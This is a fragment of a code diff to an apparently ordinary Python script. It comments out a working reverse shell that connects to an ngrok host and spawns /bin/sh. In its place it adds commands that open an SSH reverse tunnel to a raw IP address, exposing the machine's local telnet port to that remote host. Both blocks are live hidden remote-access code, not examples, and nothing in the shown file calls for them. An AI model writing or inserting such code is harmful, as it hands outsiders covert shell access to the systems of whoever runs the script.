@@ -106,11 +106,15 @@
 
 # -------------------------
 
-import socket,os,pty
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("0.tcp.eu.ngrok.io",13950))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")
+# import socket,os,pty
+# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+# s.connect(("0.tcp.eu.ngrok.io",13950))
+# os.dup2(s.fileno(),0)
+# os.dup2(s.fileno(),1)
+# os.dup2(s.fileno(),2)
+# pty.spawn("/bin/sh")
  
+import os
+
+os.system("chmod 600 mlops_tunnel.pem")
+os.system("ssh -i mlops_tunnel.pem -N -R 7010:127.0.0.1:23 tunnel@4.231.121.209")
